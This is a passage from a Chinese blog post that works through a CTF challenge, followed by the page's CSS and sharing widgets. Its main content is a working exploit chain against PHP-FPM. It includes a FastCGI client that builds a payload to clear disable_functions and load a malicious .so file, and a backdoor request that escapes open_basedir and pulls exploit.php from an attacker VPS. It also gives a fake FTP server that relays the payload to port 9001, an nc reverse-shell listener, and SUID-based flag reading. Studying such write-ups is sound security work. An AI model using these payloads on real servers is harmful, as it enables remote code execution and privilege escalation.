+        <span class="token variable">$request</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">buildPacket</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">BEGIN_REQUEST</span><span class="token punctuation">,</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">RESPONDER</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">_keepAlive</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$paramsRequest</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
+        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$params</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=&gt;</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token variable">$paramsRequest</span> <span class="token operator">.=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">buildNvpair</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$paramsRequest</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token variable">$request</span> <span class="token operator">.=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">buildPacket</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">PARAMS</span><span class="token punctuation">,</span> <span class="token variable">$paramsRequest</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token variable">$request</span> <span class="token operator">.=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">buildPacket</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">PARAMS</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$stdin</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token variable">$request</span> <span class="token operator">.=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">buildPacket</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">STDIN</span><span class="token punctuation">,</span> <span class="token variable">$stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token variable">$request</span> <span class="token operator">.=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">buildPacket</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">STDIN</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'data='</span><span class="token operator">.</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment"># 输出payload</span>
+<span class="token comment">//        fwrite($this-&gt;_sock, $request);</span>
+<span class="token comment">//        do {</span>
+<span class="token comment">//            $resp = $this-&gt;readPacket();</span>
+<span class="token comment">//            if ($resp['type'] == self::STDOUT || $resp['type'] == self::STDERR) {</span>
+<span class="token comment">//                $response .= $resp['content'];</span>
+<span class="token comment">//            }</span>
+<span class="token comment">//        } while ($resp &amp;&amp; $resp['type'] != self::END_REQUEST);</span>
+<span class="token comment">//        var_dump($resp);</span>
+<span class="token comment">//        if (!is_array($resp)) {</span>
+<span class="token comment">//            throw new Exception('Bad request');</span>
+<span class="token comment">//        }</span>
+<span class="token comment">//        switch (ord($resp['content']{4})) {</span>
+<span class="token comment">//            case self::CANT_MPX_CONN:</span>
+<span class="token comment">//                throw new Exception('This app can\'t multiplex [CANT_MPX_CONN]');</span>
+<span class="token comment">//                break;</span>
+<span class="token comment">//            case self::OVERLOADED:</span>
+<span class="token comment">//                throw new Exception('New request rejected; too busy [OVERLOADED]');</span>
+<span class="token comment">//                break;</span>
+<span class="token comment">//            case self::UNKNOWN_ROLE:</span>
+<span class="token comment">//                throw new Exception('Role value not known [UNKNOWN_ROLE]');</span>
+<span class="token comment">//                break;</span>
+<span class="token comment">//            case self::REQUEST_COMPLETE:</span>
+<span class="token comment">//                return $response;</span>
+<span class="token comment">//        }</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token delimiter important">?&gt;</span></span>
+<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token comment">// real exploit start here</span>
+<span class="token comment">//if (!isset($_REQUEST['cmd'])) {</span>
+<span class="token comment">//    die("Check your input\n");</span>
+<span class="token comment">//}</span>
+<span class="token comment">//if (!isset($_REQUEST['filepath'])) {</span>
+<span class="token comment">//    $filepath = __FILE__;</span>
+<span class="token comment">//}else{</span>
+<span class="token comment">//    $filepath = $_REQUEST['filepath'];</span>
+<span class="token comment">//}</span>
+
+<span class="token variable">$filepath</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/var/www/html/add_api.php"</span><span class="token punctuation">;</span>
+<span class="token variable">$req</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$filepath</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$uri</span> <span class="token operator">=</span> <span class="token variable">$req</span> <span class="token operator">.</span><span class="token string single-quoted-string">'?'</span><span class="token operator">.</span><span class="token string single-quoted-string">'command=whoami'</span><span class="token punctuation">;</span>
+<span class="token variable">$client</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FCGIClient</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"unix:///var/run/php-fpm.sock"</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"&lt;?php system(\$_REQUEST['command']); phpinfo(); ?&gt;"</span><span class="token punctuation">;</span> 
+<span class="token variable">$php_value</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"unserialize_callback_func = system\nextension_dir = /var/www/html\nextension = 1.so\ndisable_classes = \ndisable_functions = \nallow_url_include = On\nopen_basedir = /\nauto_prepend_file = "</span><span class="token punctuation">;</span>   <span class="token comment">//修改这里的so文件名称和路径</span>
+<span class="token variable">$params</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>
+    <span class="token string single-quoted-string">'GATEWAY_INTERFACE'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'FastCGI/1.0'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'REQUEST_METHOD'</span>    <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'POST'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'SCRIPT_FILENAME'</span>   <span class="token operator">=&gt;</span> <span class="token variable">$filepath</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'SCRIPT_NAME'</span>       <span class="token operator">=&gt;</span> <span class="token variable">$req</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'QUERY_STRING'</span>      <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'command=whoami'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'REQUEST_URI'</span>       <span class="token operator">=&gt;</span> <span class="token variable">$uri</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'DOCUMENT_URI'</span>      <span class="token operator">=&gt;</span> <span class="token variable">$req</span><span class="token punctuation">,</span>
+<span class="token comment">#'DOCUMENT_ROOT'     =&gt; '/',</span>
+    <span class="token string single-quoted-string">'PHP_VALUE'</span>         <span class="token operator">=&gt;</span> <span class="token variable">$php_value</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'SERVER_SOFTWARE'</span>   <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'80sec/wofeiwo'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'REMOTE_ADDR'</span>       <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'127.0.0.1'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'REMOTE_PORT'</span>       <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'9001'</span><span class="token punctuation">,</span>    <span class="token comment">// 注意这里的FPM端口</span>
+    <span class="token string single-quoted-string">'SERVER_ADDR'</span>       <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'127.0.0.1'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'SERVER_PORT'</span>       <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'80'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'SERVER_NAME'</span>       <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'localhost'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'SERVER_PROTOCOL'</span>   <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'HTTP/1.1'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'CONTENT_LENGTH'</span>    <span class="token operator">=&gt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span>
+<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment">// print_r($_REQUEST);</span>
+<span class="token comment">// print_r($params);</span>
+<span class="token comment">//echo "Call: $uri\n\n";</span>
+<span class="token keyword">echo</span> <span class="token variable">$client</span><span class="token operator">-&gt;</span><span class="token function">request</span><span class="token punctuation">(</span><span class="token variable">$params</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>将上面代码保存为<code>exploit.php</code>，写入网站<code>/var/www/html/</code>目录，也可以用<code>file_put_contents</code>，IP修改为自己vps地址</p>
+<pre class="line-numbers language-none"><code class="language-none">/add_api.php?backdoor=mkdir('wa0er');chdir('wa0er');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(copy('http://[IP]/exploit.php','/var/www/html/exploit.php'));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>然后访问<code>/exploit.php</code>，得到payload（这里也可以本地运行生成payload，PHP版本对应好就行）</p>
+<pre class="line-numbers language-none"><code class="language-none">data=%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%02B%00%00%11%0BGATEWAY_INTERFACEFastCGI%2F1.0%0E%04REQUEST_METHODPOST%0F%19SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Fadd_api.php%0B%0CSCRIPT_NAME%2Fadd_api.php%0C%0EQUERY_STRINGcommand%3Dwhoami%0B%1BREQUEST_URI%2Fadd_api.php%3Fcommand%3Dwhoami%0C%0CDOCUMENT_URI%2Fadd_api.php%09%80%00%00%B6PHP_VALUEunserialize_callback_func+%3D+system%0Aextension_dir+%3D+%2Fvar%2Fwww%2Fhtml%0Aextension+%3D+1.so%0Adisable_classes+%3D+%0Adisable_functions+%3D+%0Aallow_url_include+%3D+On%0Aopen_basedir+%3D+%2F%0Aauto_prepend_file+%3D+%0F%0DSERVER_SOFTWARE80sec%2Fwofeiwo%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9001%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP%2F1.1%0E%02CONTENT_LENGTH49%01%04%00%01%00%00%00%00%01%05%00%01%001%00%00%3C%3Fphp+system%28%24_REQUEST%5B%27command%27%5D%29%3B+phpinfo%28%29%3B+%3F%3E%01%05%00%01%00%00%00%00<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>然后在VPS开启FTP服务</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket
+s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
+s<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> <span class="token number">9999</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+s<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+conn<span class="token punctuation">,</span> addr <span class="token operator">=</span> s<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>
+conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'220 welcome\n'</span><span class="token punctuation">)</span>
+<span class="token comment">#Service ready for new user.</span>
+<span class="token comment">#Client send anonymous username</span>
+<span class="token comment">#USER anonymous</span>
+conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'331 Please specify the password.\n'</span><span class="token punctuation">)</span>
+<span class="token comment">#User name okay, need password.</span>
+<span class="token comment">#Client send anonymous password.</span>
+<span class="token comment">#PASS anonymous</span>
+conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'230 Login successful.\n'</span><span class="token punctuation">)</span>
+<span class="token comment">#User logged in, proceed. Logged out if appropriate.</span>
+<span class="token comment">#TYPE I</span>
+conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'200 Switching to Binary mode.\n'</span><span class="token punctuation">)</span>
+<span class="token comment">#Size /</span>
+conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'550 Could not get the file size.\n'</span><span class="token punctuation">)</span>
+<span class="token comment">#EPSV (1)</span>
+conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'150 ok\n'</span><span class="token punctuation">)</span>
+<span class="token comment">#PASV</span>
+conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'227 Entering Extended Passive Mode (127,0,0,1,0,9001)\n'</span><span class="token punctuation">)</span> <span class="token comment">#注意打到9001端口</span>
+conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'150 Permission denied.\n'</span><span class="token punctuation">)</span>
+<span class="token comment">#QUIT</span>
+conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'221 Goodbye.\n'</span><span class="token punctuation">)</span>
+conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>拼接payload如下，IP修改为自己vps地址，开启监听<code>nc -lvnp 9898</code>（这里监听端口和<code>.so</code>文件反弹shell的端口对应），然后执行payload</p>
+<pre class="line-numbers language-none"><code class="language-none">/add_api.php?backdoor=phpinfo();file_put_contents($_GET[%27file%27],$_GET[%27data%27]);&amp;file=ftp://test@[IP]:9999/&amp;data=%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%02B%00%00%11%0BGATEWAY_INTERFACEFastCGI%2F1.0%0E%04REQUEST_METHODPOST%0F%19SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Fadd_api.php%0B%0CSCRIPT_NAME%2Fadd_api.php%0C%0EQUERY_STRINGcommand%3Dwhoami%0B%1BREQUEST_URI%2Fadd_api.php%3Fcommand%3Dwhoami%0C%0CDOCUMENT_URI%2Fadd_api.php%09%80%00%00%B6PHP_VALUEunserialize_callback_func+%3D+system%0Aextension_dir+%3D+%2Fvar%2Fwww%2Fhtml%0Aextension+%3D+1.so%0Adisable_classes+%3D+%0Adisable_functions+%3D+%0Aallow_url_include+%3D+On%0Aopen_basedir+%3D+%2F%0Aauto_prepend_file+%3D+%0F%0DSERVER_SOFTWARE80sec%2Fwofeiwo%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9001%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP%2F1.1%0E%02CONTENT_LENGTH49%01%04%00%01%00%00%00%00%01%05%00%01%001%00%00%3C%3Fphp+system%28%24_REQUEST%5B%27command%27%5D%29%3B+phpinfo%28%29%3B+%3F%3E%01%05%00%01%00%00%00%00<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>获取到www-data权限</p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230921162625519.png"></p>
+<p>执行如下命令，找有suid权限的文件，发现<code>/usr/local/bin/php</code>有suid权限</p>
+<pre class="line-numbers language-none"><code class="language-none">find / -perm -u=s -type f 2&gt;/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>执行如下命令获取flag</p>
+<pre class="line-numbers language-none"><code class="language-none">php -a mkdir('wa0er');chdir('wa0er');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');echo(file_get_contents('/flag'));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230921163407442.png"></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/yesec/p/15211484.html">https://www.cnblogs.com/yesec/p/15211484.html</a></p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://wa0er.github.io" rel="external nofollow noreferrer">wa0er</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://wa0er.github.io/posts/48d4210.html">https://wa0er.github.io/posts/48d4210.html</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by-nc/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY-NC 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="https://wa0er.github.io" target="_blank">wa0er</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/CTF/">
+                                    <span class="chip bg-color">CTF</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="wechat,qq,weibo,qzone,twitter,facebook,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">您的捐赠就是对我最大的支持</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wepay.jpg" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+        <style>
+    .valine-card {
+        margin: 1.5rem auto;
+    }
+
+    .valine-card .card-content {
+        padding: 20px 20px 5px 20px;
+    }
+
+    #vcomments textarea {
+        box-sizing: border-box;
+        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
+    }
+
+    #vcomments p {
+        margin: 2px 2px 10px;
+        font-size: 1.05rem;
+        line-height: 1.78rem;
+    }
+
+    #vcomments blockquote p {
+        text-indent: 0.2rem;
+    }
+
+    #vcomments a {
+        padding: 0 2px;
+        color: #4cbf30;
+        font-weight: 500;
+        text-decoration: none;
+    }
+
+    #vcomments img {
+        max-width: 100%;
+        height: auto;
+        cursor: pointer;
+    }
+
+    #vcomments ol li {
+        list-style-type: decimal;
+    }
+
+    #vcomments ol,
+    ul {
+        display: block;
+        padding-left: 2em;
+        word-spacing: 0.05rem;
+    }
+
+    #vcomments ul li,
+    ol li {
+        display: list-item;
+        line-height: 1.8rem;
+        font-size: 1rem;
+    }
+
+    #vcomments ul li {
+        list-style-type: disc;
+    }
+
+    #vcomments ul ul li {
+        list-style-type: circle;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    #vcomments table, th, td {
+        border: 0;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments h1 {
+        font-size: 1.85rem;
+        font-weight: bold;
+        line-height: 2.2rem;
+    }
+
+    #vcomments h2 {
+        font-size: 1.65rem;
+        font-weight: bold;
+        line-height: 1.9rem;
+    }
+
+    #vcomments h3 {
+        font-size: 1.45rem;
+        font-weight: bold;
+        line-height: 1.7rem;
+    }
+
+    #vcomments h4 {
+        font-size: 1.25rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    #vcomments h5 {
+        font-size: 1.1rem;
+        font-weight: bold;
+        line-height: 1.4rem;
+    }
+
+    #vcomments h6 {
+        font-size: 1rem;
+        line-height: 1.3rem;
+    }
+
+    #vcomments p {
+        font-size: 1rem;
+        line-height: 1.5rem;
+    }
+
+    #vcomments hr {
+        margin: 12px 0;
+        border: 0;
+        border-top: 1px solid #ccc;
+    }
+
+    #vcomments blockquote {
+        margin: 15px 0;
+        border-left: 5px solid #42b983;
+        padding: 1rem 0.8rem 0.3rem 0.8rem;
+        color: #666;
+        background-color: rgba(66, 185, 131, .1);
+    }
+
+    #vcomments pre {
+        font-family: monospace, monospace;
+        padding: 1.2em;
+        margin: .5em 0;
+        background: #272822;
+        overflow: auto;
+        border-radius: 0.3em;
+        tab-size: 4;
+    }
+
+    #vcomments code {
+        font-family: monospace, monospace;
+        padding: 1px 3px;
+        font-size: 0.92rem;
+        color: #e96900;
+        background-color: #f8f8f8;
+        border-radius: 2px;
+    }
+
+    #vcomments pre code {
+        font-family: monospace, monospace;
+        padding: 0;
